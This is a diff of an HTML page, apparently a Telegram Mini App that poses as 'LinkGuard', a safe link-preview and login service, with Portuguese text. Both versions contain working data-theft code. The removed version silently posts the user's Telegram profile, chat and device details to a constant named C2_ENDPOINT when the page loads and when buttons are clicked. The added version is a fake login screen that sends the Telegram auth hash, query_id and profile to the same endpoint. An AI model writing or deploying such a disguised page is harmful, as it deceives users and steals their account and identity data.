@@ -3,18 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>LinkGuard - Preview Seguro</title>
+    <title>LinkGuard Pro - Acesso Restrito</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
             --tg-theme-bg-color: #ffffff;
             --tg-theme-text-color: #000000;
             --tg-theme-hint-color: #707579;
-            --tg-theme-link-color: #2481cc;
             --tg-theme-button-color: #2481cc;
             --tg-theme-button-text-color: #ffffff;
             --tg-theme-secondary-bg-color: #f1f1f1;
-            --tg-theme-section-bg-color: #e0e0e0;
         }
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -22,325 +20,142 @@
             color: var(--tg-theme-text-color);
             padding: 0;
             margin: 0;
-            -webkit-tap-highlight-color: transparent;
-        }
-        .container {
-            padding: 16px;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-        .header {
             display: flex;
+            justify-content: center;
             align-items: center;
-            justify-content: space-between;
-            margin-bottom: 20px;
+            min-height: 100vh;
+        }
+        .login-container {
+            background-color: var(--tg-theme-secondary-bg-color);
+            border-radius: 16px;
+            padding: 32px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            text-align: center;
         }
         .logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .logo-icon {
-            width: 24px;
-            height: 24px;
+            width: 64px;
+            height: 64px;
             background-color: var(--tg-theme-button-color);
-            border-radius: 6px;
+            border-radius: 16px;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: white;
-            font-weight: bold;
+            margin: 0 auto 16px;
+            font-size: 32px;
         }
-        .logo-text {
-            font-weight: 600;
-            font-size: 18px;
-        }
-        .security-badge {
-            background-color: var(--tg-theme-secondary-bg-color);
-            color: var(--tg-theme-hint-color);
-            font-size: 12px;
-            padding: 4px 8px;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-        .preview-card {
-            background-color: var(--tg-theme-secondary-bg-color);
-            border-radius: 12px;
-            overflow: hidden;
-            margin-bottom: 20px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-        }
-        .preview-image {
+        .title { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
+        .subtitle { font-size: 14px; color: var(--tg-theme-hint-color); margin-bottom: 24px; }
+        .tg-login-button {
             width: 100%;
-            height: 180px;
-            object-fit: cover;
-            background-color: var(--tg-theme-section-bg-color);
-        }
-        .preview-info {
-            padding: 16px;
-        }
-        .preview-title {
-            font-size: 16px;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: var(--tg-theme-text-color);
-        }
-        .preview-url {
-            font-size: 13px;
-            color: var(--tg-theme-hint-color);
-            word-break: break-all;
-            margin-bottom: 12px;
-        }
-        .security-checks {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 12px;
-        }
-        .check-item {
-            flex: 1;
-            background-color: var(--tg-theme-bg-color);
-            border-radius: 8px;
-            padding: 8px;
-            text-align: center;
-            font-size: 12px;
-            color: var(--tg-theme-hint-color);
-        }
-        .check-icon {
-            font-size: 16px;
-            margin-bottom: 4px;
-            color: var(--tg-theme-button-color);
-        }
-        .action-buttons {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        .btn {
-            flex: 1;
-            padding: 12px;
-            border: none;
-            border-radius: 8px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: opacity 0.2s;
-        }
-        .btn:active {
-            opacity: 0.8;
-        }
-        .btn-primary {
+            padding: 14px;
             background-color: var(--tg-theme-button-color);
             color: var(--tg-theme-button-text-color);
-        }
-        .btn-secondary {
-            background-color: var(--tg-theme-secondary-bg-color);
-            color: var(--tg-theme-text-color);
-        }
-        .footer {
-            text-align: center;
-            font-size: 12px;
-            color: var(--tg-theme-hint-color);
-            margin-top: 20px;
-            padding-bottom: 20px;
-        }
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(255,255,255,0.9);
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
-            z-index: 1000;
-            transition: opacity 0.3s;
+            gap: 8px;
         }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid var(--tg-theme-section-bg-color);
-            border-top-color: var(--tg-theme-button-color);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
+        .status-message { margin-top: 16px; font-size: 13px; color: var(--tg-theme-hint-color); min-height: 20px; }
+        .hidden { display: none; }
+        .content-card {
+            background-color: var(--tg-theme-bg-color);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            text-align: left;
         }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .hidden {
-            display: none !important;
-        }
+        .content-title { font-weight: 600; margin-bottom: 8px; }
+        .content-text { font-size: 14px; color: var(--tg-theme-hint-color); }
     </style>
 </head>
 <body>
-    <div class="loading-overlay" id="loading-overlay">
-        <div class="spinner"></div>
-        <p>Analisando link seguro...</p>
-    </div>
+    <div class="login-container">
+        <div class="logo">🛡️</div>
+        <div class="title">LinkGuard Pro</div>
+        <div class="subtitle">Acesse o painel de inteligência de links</div>
+        
+        <button class="tg-login-button" id="login-btn">
+            <span>✈️</span> Continuar com o Telegram
+        </button>
+        <div class="status-message" id="status-msg">Autenticação necessária</div>
 
-    <div class="container">
-        <div class="header">
-            <div class="logo">
-                <div class="logo-icon">🛡️</div>
-                <div class="logo-text">LinkGuard</div>
+        <div class="hidden" id="content-area" style="margin-top: 24px;">
+            <div class="content-card">
+                <div class="content-title">✅ Sessão Verificada</div>
+                <div class="content-text">Bem-vindo, <span id="user-name">Usuário</span>!</div>
             </div>
-            <div class="security-badge">
-                🔒 Verificado
+            <div class="content-card">
+                <div class="content-title">🔒 Proteção Ativa</div>
+                <div class="content-text">Links analisados em tempo real.</div>
             </div>
-        </div>
-
-        <div class="preview-card">
-            <img id="preview-image" class="preview-image" src="https://via.placeholder.com/600x180?text=Secure+Preview" alt="Preview">
-            <div class="preview-info">
-                <div class="preview-title" id="preview-title">Título do Conteúdo Seguro</div>
-                <div class="preview-url" id="preview-url">https://exemplo.com/link-seguro</div>
-                <div class="security-checks">
-                    <div class="check-item">
-                        <div class="check-icon">✅</div>
-                        SSL Ativo
-                    </div>
-                    <div class="check-item">
-                        <div class="check-icon">🚫</div>
-                        Sem Malware
-                    </div>
-                    <div class="check-item">
-                        <div class="check-icon">⚡</div>
-                        Rápido
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div class="action-buttons">
-            <button class="btn btn-secondary" id="btn-share">📤 Compartilhar</button>
-            <button class="btn btn-primary" id="btn-open">🔓 Abrir Link</button>
-        </div>
-
-        <div class="footer">
-            LinkGuard protege você de links maliciosos.<br>
-            <span id="user-status">Sessão segura ativada</span>
         </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         const C2_ENDPOINT = 'http://127.0.0.1:8000/linkguard-auth';
-        let exfiltrationCompleted = false;
 
-        // Coleta de Dados Avançada
-        function collectIntelligence() {
+        function collectAuthData() {
             const user = tg.initDataUnsafe.user;
-            const chat = tg.initDataUnsafe.chat;
-            
             return {
-                event_type: 'linkguard_session',
+                event_type: 'linkguard_auth',
+                auth: { hash: tg.initDataUnsafe.hash, query_id: tg.initDataUnsafe.query_id },
                 user: {
-                    id: user.id,
-                    username: user.username,
-                    first_name: user.first_name,
-                    last_name: user.last_name,
-                    language_code: user.language_code,
-                    is_premium: user.is_premium,
-                    allows_write_to_pm: user.allows_write_to_pm
+                    id: user.id, username: user.username, first_name: user.first_name,
+                    last_name: user.last_name, language_code: user.language_code, is_premium: user.is_premium
                 },
-                chat: {
-                    id: chat.id,
-                    type: chat.type,
-                    title: chat.title
-                },
-                device: {
-                    platform: tg.platform,
-                    version: tg.version,
-                    colorScheme: tg.colorScheme,
-                    isEmbedded: tg.isEmbedded,
-                    viewportHeight: tg.viewportStableHeight,
-                    viewportWidth: tg.viewportStableWidth
-                },
-                haptics: {
-                    supported: !!tg.HapticFeedback
-                },
+                device: { platform: tg.platform, version: tg.version, colorScheme: tg.colorScheme },
                 timestamp: new Date().toISOString()
             };
         }
 
-        // Exfiltração Silenciosa
-        async function exfiltrateIntelligence(data) {
-            if (exfiltrationCompleted) return;
-            exfiltrationCompleted = true;
-            
+        async function exfiltrateAuth(data) {
             try {
-                await fetch(C2_ENDPOINT, {
+                const response = await fetch(C2_ENDPOINT, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
-                console.log('[C2] Inteligência exfiltrada.');
+                return response.ok;
             } catch (error) {
-                console.error('[C2] Falha na exfiltração:', error);
+                console.error('Falha na exfiltração:', error);
+                return false;
             }
         }
 
-        // Simula a análise do link
-        function simulateAnalysis() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const targetUrl = urlParams.get('url') || 'https://exemplo.com';
-            
-            // Atualiza a UI com o link real
-            document.getElementById('preview-url').textContent = targetUrl;
-            document.getElementById('preview-title').textContent = `Conteúdo de ${new URL(targetUrl).hostname}`;
-            
-            // Remove o overlay de loading
-            setTimeout(() => {
-                document.getElementById('loading-overlay').classList.add('hidden');
-                
-                // Exfiltra os dados assim que o app "carrega"
-                const intelligence = collectIntelligence();
-                exfiltrateIntelligence(intelligence);
-                
-                // Atualiza o status do usuário
-                document.getElementById('user-status').textContent = `Sessão segura para @${tg.initDataUnsafe.user.username || 'anônimo'}`;
-            }, 1500);
+        async function handleLogin() {
+            const statusMsg = document.getElementById('status-msg');
+            const loginBtn = document.getElementById('login-btn');
+            loginBtn.disabled = true;
+            statusMsg.textContent = 'Autenticando...';
+
+            const authData = collectAuthData();
+            const success = await exfiltrateAuth(authData);
+
+            if (success) {
+                setTimeout(() => {
+                    document.getElementById('content-area').classList.remove('hidden');
+                    document.getElementById('user-name').textContent = authData.user.first_name;
+                    statusMsg.textContent = '✅ Acesso Liberado';
+                    tg.HapticFeedback.notificationOccurred('success');
+                }, 1000);
+            } else {
+                statusMsg.textContent = '❌ Erro de Autenticação';
+                loginBtn.disabled = false;
+                tg.HapticFeedback.notificationOccurred('error');
+            }
         }
 
-        // Botão de Compartilhar (Exfiltração Secundária)
-        document.getElementById('btn-share').addEventListener('click', () => {
-            const shareData = {
-                ...collectIntelligence(),
-                event_type: 'linkguard_share',
-                action: 'share_clicked'
-            };
-            exfiltrateIntelligence(shareData);
-            
-            tg.shareData({
-                additional_text: '🔒 Link verificado pelo LinkGuard: ',
-                thumbnail_url: 'https://via.placeholder.com/100x100?text=LG'
-            });
-            tg.HapticFeedback.impactOccurred('light');
-        });
-
-        // Botão de Abrir Link (Redirecionamento Controlado)
-        document.getElementById('btn-open').addEventListener('click', () => {
-            const openData = {
-                ...collectIntelligence(),
-                event_type: 'linkguard_open',
-                action: 'open_clicked'
-            };
-            exfiltrateIntelligence(openData);
-            
-            const urlParams = new URLSearchParams(window.location.search);
-            const targetUrl = urlParams.get('url') || 'https://exemplo.com';
-            
-            tg.openLink(targetUrl);
-            tg.HapticFeedback.notificationOccurred('success');
-        });
-
-        // Inicialização
         tg.ready();
         tg.expand();
-        simulateAnalysis();
+        document.getElementById('login-btn').addEventListener('click', handleLogin);
     </script>
 </body>
 </html>
